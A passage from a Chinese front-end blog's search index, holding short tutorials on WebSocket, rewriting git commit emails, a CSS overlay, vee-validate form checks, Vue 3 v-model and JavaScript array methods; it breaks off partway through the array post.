<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JavaScript使用WebSocket</title>
    <url>/20221123/JavaScript%E4%BD%BF%E7%94%A8WebSocket/</url>
    <content><![CDATA[<p>使用 WebSocket 可以实现点对点的全双工即时通信</p>
<span id="more"></span>
<h1>ws 客户端的基本使用</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://echo.websocket.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Connection open ...&quot;</span>);</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="string">&quot;Hello WebSockets!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received Message: &quot;</span> + evt.<span class="property">data</span>);</span><br><span class="line">    ws.<span class="title function_">close</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ws.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params">evt</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Connection closed.&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="新建实例">新建实例</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://localhost:8080&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>注意:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>不能 catch 住 websocket 的超时 error 的</p>
</li>
</ul>
<h3 id="webSocket-readyState">webSocket.readyState</h3>
<p>返回实例的当前状态</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">CONNECTING</span>：值为<span class="number">0</span>，表示正在连接。</span><br><span class="line"><span class="variable constant_">OPEN</span>：值为<span class="number">1</span>，表示连接成功，可以通信了。</span><br><span class="line"><span class="variable constant_">CLOSING</span>：值为<span class="number">2</span>，表示连接正在关闭。</span><br><span class="line"><span class="variable constant_">CLOSED</span>：值为<span class="number">3</span>，表示连接已经关闭，或者打开连接失败。</span><br></pre></td></tr></table></figure>
<h3 id="webSocket-onopen">webSocket.onopen</h3>
<p>实例对象的<code>onopen</code>属性，用于指定连接成功后的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ws.<span class="title function_">addEventListener</span>(<span class="string">&quot;open&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    ws.<span class="title function_">send</span>(<span class="string">&quot;Hello Server!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="webSocket-onclose">webSocket.onclose</h3>
<p>实例对象的<code>onclose</code>属性，用于指定连接关闭后的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ws.<span class="title function_">addEventListener</span>(<span class="string">&quot;close&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> code = event.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">var</span> reason = event.<span class="property">reason</span>;</span><br><span class="line">    <span class="keyword">var</span> wasClean = event.<span class="property">wasClean</span>;</span><br><span class="line">    <span class="comment">// handle close event</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="webSocket-onmessage">webSocket.onmessage</h3>
<p>实例对象的<code>onmessage</code>属性，用于指定收到服务器数据后的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ws.<span class="title function_">addEventListener</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = event.<span class="property">data</span>;</span><br><span class="line">    <span class="comment">// 处理数据</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="webSocket-send">webSocket.send()</h3>
<p>实例对象的<code>send()</code>方法用于向服务器发送数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ws.<span class="title function_">send</span>(<span class="string">&quot;your message&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="webSocket-onerror">webSocket.onerror</h2>
<p>实例对象的<code>onerror</code>属性，用于指定报错时的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">socket.<span class="title function_">addEventListener</span>(<span class="string">&quot;error&quot;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="comment">// handle error event</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h1>ws 服务器端</h1>
<p>首先引入<code>ws</code>模块, 然后与客户端类似, 新建 socket 实例</p>
<p>使用<code>socket.send()</code>发送数据</p>
<p>使用 <code>socket.addEventListener(&quot;message&quot;, (&#123;data&#125;) =&gt; &#123;&#125;)</code>或<code>socket.on(&quot;messgae&quot;,()=&gt;&#123;&#125;)</code> 接收数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">WebSocketServer</span> &#125; <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> server = <span class="keyword">new</span> <span class="title class_">WebSocketServer</span>(&#123; <span class="attr">port</span>: <span class="number">1234</span> &#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;connection&quot;</span>, <span class="function"><span class="params">socket</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 向客户端发送消息</span></span><br><span class="line">    socket.<span class="title function_">send</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;hello from server&quot;</span>,</span><br><span class="line">            <span class="attr">code</span>: <span class="string">&quot;200&quot;</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从客户端接收消息</span></span><br><span class="line">    socket.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        <span class="keyword">const</span> packet = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(packet);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    socket.<span class="title function_">addEventListener</span>(<span class="string">&quot;message&quot;</span>, <span class="function">(<span class="params">&#123; data &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="获取所有连接">获取所有连接</h2>
<p>每个 ws 连接都为一个独立的<code>socket</code>实例</p>
<p>使用<code>server.clients</code>列出所有连接</p>
<p>向每个连接广播消息:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">boardCast</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    dataObj.<span class="property">onlineUser</span> = ws.<span class="property">clients</span>.<span class="property">size</span>;</span><br><span class="line">    ws.<span class="property">clients</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">client</span> =&gt;</span> &#123;</span><br><span class="line">        client.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(dataObj));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Git批量修改已提交的邮箱信息</title>
    <url>/20220511/Git%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E5%B7%B2%E6%8F%90%E4%BA%A4%E7%9A%84%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p>新建 <code>rename.sh</code> 内容如下</p>
<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">git filter-branch --env-filter <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OLD_EMAIL=&quot;原邮箱地址&quot;</span></span><br><span class="line"><span class="string">CORRECT_NAME=&quot;新用户名&quot;</span></span><br><span class="line"><span class="string">CORRECT_EMAIL=&quot;新邮箱地址&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">&#x27;</span> --tag-name-filter <span class="built_in">cat</span> -- --branches --tags</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用 git bash 运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh rename.sh</span><br></pre></td></tr></table></figure>
<p>强行提交</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin --force --all</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS实现遮罩效果</title>
    <url>/20221216/CSS%E5%AE%9E%E7%8E%B0%E9%81%AE%E7%BD%A9%E6%95%88%E6%9E%9C/</url>
    <content><![CDATA[<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="attr">background</span>: <span class="title function_">url</span>(@/img/bg.<span class="property">jpg</span>) <span class="title function_">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.3</span>);</span><br><span class="line">background-<span class="attr">size</span>: cover;</span><br><span class="line">background-blend-<span class="attr">mode</span>: multiply;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>vue vee-validate 表单验证</title>
    <url>/20230106/vue-vee-validate-%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<p>使用步骤</p>
<ul class="lvl-0">
<li class="lvl-4">使用第三包提供的<code>Form</code>标签将表单整个区域包裹起来, 如果要进行整体验证, 需要给<code>Form</code>打<code>ref</code></li>
<li class="lvl-4">使用第三方包提供的<code>Filed</code>标签将输入框的<code>input</code>替换掉</li>
<li class="lvl-4">如果表单需要校验，那么必须有<code>name</code>属性</li>
<li class="lvl-4">将校验规则通过<code>rules</code>绑定到需要校验的<code>Field</code>标签上</li>
<li class="lvl-4">当用户输入的内容未通过验证规则时，错误信息是从<code>Form</code>标签上的插槽中解构出来的</li>
</ul>
<span id="more"></span>
<p>引入组件</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Form</span>, <span class="title class_">Field</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vee-validate&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>模板写法</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Form</span></span><br><span class="line">    v-slot=<span class="string">&quot;&#123; errors &#125;&quot;</span></span><br><span class="line">    ref=<span class="string">&quot;fromValidate&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-text clearFix&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Field</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">&quot;邮箱/用户名/手机号&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">v-model</span>=<span class="string">&quot;phone&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">name</span>=<span class="string">&quot;account&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:rules</span>=<span class="string">&quot;checkAccount&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>&#123;&#123; errors.account &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input-text clearFix&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Field</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">v-model</span>=<span class="string">&quot;password&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">:rules</span>=<span class="string">&quot;checkPassword&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;&#123; errors.password &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">click.prevent</span>=<span class="string">&quot;login&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span></span></span><br><span class="line"><span class="language-xml">        登<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>录</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Form</span>&gt;</span><br></pre></td></tr></table></figure>
<p>书写验证规则</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义验证规则</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkAccount</span> = (<span class="params">val: <span class="built_in">unknown</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> reg = <span class="regexp">/^[\a-zA-Z0-9_]+$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (!val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请输入账号&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (reg.<span class="title function_">test</span>(val <span class="keyword">as</span> <span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;账号不合法 请输入6-16位数字字母下划线&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkPassword</span> = (<span class="params">val: <span class="built_in">unknown</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请输入密码&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>进行整体验证</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">login</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; valid &#125; = <span class="keyword">await</span> fromValidate.<span class="property">value</span>?.<span class="title function_">validate</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(valid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">            <span class="comment">// 如果验证通过进行下一步</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3中 v-model 实现父子组件数据通信双向绑定</title>
    <url>/20230114/Vue3%E4%B8%AD%20v-model%20%E5%AE%9E%E7%8E%B0%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<p>如果使用 v-model 给子组件绑定一个数据, 例如<code>v-model=&quot;msg&quot;</code>, 那么子组件 props 传进来的数据为<code>modelValue</code>, 要手动触发的事件为<code>update:modelValue</code></p>
<span id="more"></span>
<p>父组件</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hello&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">test</span> <span class="attr">v-model</span>=<span class="string">&quot;msg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
<p>子组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        请输入</span><br><span class="line">        &lt;input</span><br><span class="line">            type=&quot;text&quot;</span><br><span class="line">            :value=&quot;modelValue&quot;</span><br><span class="line">            @input=&quot;$emit(&#x27;update:modelValue&#x27;, $event.target.value)&quot;</span><br><span class="line">        /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        props: [&quot;modelValue&quot;],</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>vue3 中, 可以使用 v-model 绑定多个数据, 使用<code>v-model:name=&quot;name&quot; v-model:age=&quot;age&quot;</code>的形式绑定数据, 子组件的 props 收到的数据为<code>v-model:</code>后面的名称, 如果要更新这个数据, 需要触发自定义事件<code>update:xxx</code>的形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 父组件</span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">    import test from &quot;./components/test.vue&quot;;</span><br><span class="line">    import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">    const name = ref(&quot;tim&quot;);</span><br><span class="line">    const age = ref(19);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;test</span><br><span class="line">        v-model:name=&quot;name&quot;</span><br><span class="line">        v-model:age=&quot;age&quot;</span><br><span class="line">    /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">// 子组件</span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">    const props = defineProps([&quot;name&quot;, &quot;age&quot;]);</span><br><span class="line">    const emit = defineEmits([&quot;update:age&quot;]);</span><br><span class="line">    const addAge = () =&gt; &#123;</span><br><span class="line">        emit(&quot;update:age&quot;, props.age + 1);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h1&gt;demo&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;name:&#123;&#123; name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;age:&#123;&#123; age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;addAge&quot;&gt;+1&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
<p>这个例子中, 点击按钮可以实现父子组件的数据同步增加</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript数组总结</title>
    <url>/20221205/JavaScript%E6%95%B0%E7%BB%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>js 中的数组拥有众多方法, 在这里我加以总结便于复习</p>
<span id="more"></span>
<h1>数组的定义</h1>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure>
<h1>检测是否为数组</h1>
<h2 id="使用-instanceof-运算符">使用 instanceof 运算符</h2>
<p>instanceof ﻿ 可以判断原型是否处于原型链上</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr <span class="keyword">instanceof</span> <span class="title class_">Array</span>); <span class="comment">//输出true</span></span><br></pre></td></tr></table></figure>
<h2 id="使用-Array-isArray-方法">使用 Array.isArray()方法</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span>.<span class="title function_">isArray</span>(arr)); <span class="comment">//输出true</span></span><br></pre></td></tr></table></figure>
<h1>数组方法</h1>
<h2 id="数组操作方法">数组操作方法</h2>
<h3 id="push">push()</h3>
<p>向数组后方添加一个或多个元素, <strong>改变</strong>原数组, 返回<strong>数组长度</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">push</span>(<span class="number">10</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure>
<h3 id="unshift">unshift()</h3>
<p>在数组前方添加一或多个元素, <strong>改变</strong>原数组, 返回<strong>数组长度</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">unshitf</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="pop">pop()</h3>
<p>删除数组后方的元素, <strong>改变</strong>原数组, 返回<strong>删除的内容</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">pop</span>();</span><br></pre></td></tr></table></figure>
<h3 id="shift">shift()</h3>
<p>删除数组前方的元素, <strong>改变</strong>原数组, 返回<strong>删除的内容</strong></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">shift</span>();</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="splice">splice()</h3>
<p>在指定位置删除或添加元素, <strong>改变</strong>原数组, 返回<strong>删除的元素组成的数组</strong></p>
<p>用法:</p>
<p>​<code>splice(操作元素的下标, 删除几个元素, 要添加的元素...)</code>​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr.<span class="title function_">splice</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//arr [1,4,5,6,3]</span></span><br></pre></td></tr></table></figure>
<p>‍</p>
<h2 id="数组排序">数组排序</h2>
<h3 id="reverse">reverse()</h3>
<p>​<code>reverse() ​</code>​ 可以翻转数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">arr.<span class="title function_">reverse</span>();</span><br></pre></td></tr></table></figure>
<h3 id="sort">sort()</h3>
<p>对数组进行排序, <strong>改变</strong>原数组, 返回<strong>排序结果</strong></p>
<p>用法:</p>
<p>​<code>arr.sort(排序函数)</code>​</p>
<p><strong>排序函数</strong>: 排序函数传入两个参数, 分别为依次比较的两个元素, 如果返回大于 0 的值, 就交换位置, 如果小于 0, 就不交换</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b); <span class="comment">// 升序</span></span><br><span class="line">arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a); <span class="comment">// 降序</span></span><br></pre></td></tr></table></figure>
<h2 id="连接数组">连接数组</h2>
<h3 id="concat">concat</h3>
<p>用来连接两个数组, <strong>不改变</strong>原数组, 返回<strong>连接后的数组</strong></p>
<p>语法: <code>arr1.concat(arr2, arr3)</code>​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr.<span class="title function_">concat</span>(arr2, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h2 id="数组迭代方法">数组迭代方法</h2>
<p>数组迭代方法<strong>都不会更改</strong>原数组</p>
<h3 id="every">every()</h3>
<p>判断数组元素是否<strong>全部符合</strong>某个条件, 返回 <code>true</code> ​ 或 <code>false</code>​</p>
<p>语法: <code>every(item=&gt;true)</code>​</p>
<p>如果回调函数<strong>全部</strong>返回 <code>true</code>​, 那么才返回 <code>true</code>​, 否则就是 <code>false</code>​</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">arr.<span class="title function_">every</span>(<span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> == <span class="number">0</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="some">some()</h3>
<p>判断数组元素<strong>是否符合条件</strong>, 只要有一个符合条件就返回 <code>true</code>​</p>
<p>语法: <code>some(item=&gt;true)</code>​</p>
<p>只要回调函数有一个返回了 <code>true</code>​, 那么 <code>some</code> ​ 的返回值就为 <code>true</code>​, 只有全部都是 <code>false</code>​, 那么才是 <code>false</code>​</p>
